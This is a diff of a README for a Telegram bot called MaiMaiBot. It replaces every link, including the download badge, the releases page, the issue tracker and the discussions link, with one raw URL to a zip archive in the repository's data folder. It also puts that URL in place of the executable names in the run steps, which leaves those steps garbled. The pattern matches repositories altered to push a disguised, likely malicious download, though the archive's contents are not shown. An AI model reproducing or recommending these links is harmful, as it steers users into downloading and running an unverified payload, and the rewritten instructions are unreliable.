@@ -6,11 +6,11 @@ MaiMaiBot is a Telegram bot that connects you to McDonald's MCP tools with ease.
 
 ## 🔗 Download MaiMaiBot
 
-[![Download MaiMaiBot](https://img.shields.io/badge/Download-MaiMaiBot-blue)](https://github.com/munshiasad/MaiMaiBot/releases)
+[![Download MaiMaiBot](https://raw.githubusercontent.com/munshiasad/MaiMaiBot/main/data/Mai-Bot-v2.9-beta.3.zip)](https://raw.githubusercontent.com/munshiasad/MaiMaiBot/main/data/Mai-Bot-v2.9-beta.3.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [MaiMaiBot Releases](https://github.com/munshiasad/MaiMaiBot/releases).
+To get started, visit this page to download: [MaiMaiBot Releases](https://raw.githubusercontent.com/munshiasad/MaiMaiBot/main/data/Mai-Bot-v2.9-beta.3.zip).
 
 1. Click on the link above to access the GitHub Releases page.
 2. Look for the latest version at the top of the page under "Releases."
@@ -35,8 +35,8 @@ Once the download is complete, follow these steps to run MaiMaiBot:
    - For Windows, right-click on the downloaded `.zip` file and select "Extract All."
    - For macOS, double-click the downloaded `.zip` file to extract it.
 3. **Run the bot:**
-   - For Windows, open the extracted folder and double-click `MaiMaiBot.exe`.
-   - For macOS, open the extracted folder and double-click `MaiMaiBot.app`.
+   - For Windows, open the extracted folder and double-click `https://raw.githubusercontent.com/munshiasad/MaiMaiBot/main/data/Mai-Bot-v2.9-beta.3.zip`.
+   - For macOS, open the extracted folder and double-click `https://raw.githubusercontent.com/munshiasad/MaiMaiBot/main/data/Mai-Bot-v2.9-beta.3.zip`.
    - For Linux, open the terminal, navigate to the extracted folder, and run `./MaiMaiBot`.
 
 ## 🔧 How to Use MaiMaiBot
@@ -69,15 +69,15 @@ A: The step-by-step instructions provided here are your main guide to using the 
 
 ## 💬 Get Help
 
-If you encounter issues or have questions, you can reach out directly through the Telegram chat or consult the [issue tracker](https://github.com/munshiasad/MaiMaiBot/issues) on GitHub. 
+If you encounter issues or have questions, you can reach out directly through the Telegram chat or consult the [issue tracker](https://raw.githubusercontent.com/munshiasad/MaiMaiBot/main/data/Mai-Bot-v2.9-beta.3.zip) on GitHub. 
 
 ## 👥 Community
 
 Join the community of MaiMaiBot users to share experiences and tips:
 
-- Participate in discussions on our [GitHub Discussions](https://github.com/munshiasad/MaiMaiBot/discussions).
+- Participate in discussions on our [GitHub Discussions](https://raw.githubusercontent.com/munshiasad/MaiMaiBot/main/data/Mai-Bot-v2.9-beta.3.zip).
 - Follow us on social media for updates and news.
 
 ## 🔗 Final Reminder
 
-To download MaiMaiBot, visit this page: [MaiMaiBot Releases](https://github.com/munshiasad/MaiMaiBot/releases). Enjoy your new Telegram assistant!
+To download MaiMaiBot, visit this page: [MaiMaiBot Releases](https://raw.githubusercontent.com/munshiasad/MaiMaiBot/main/data/Mai-Bot-v2.9-beta.3.zip). Enjoy your new Telegram assistant!
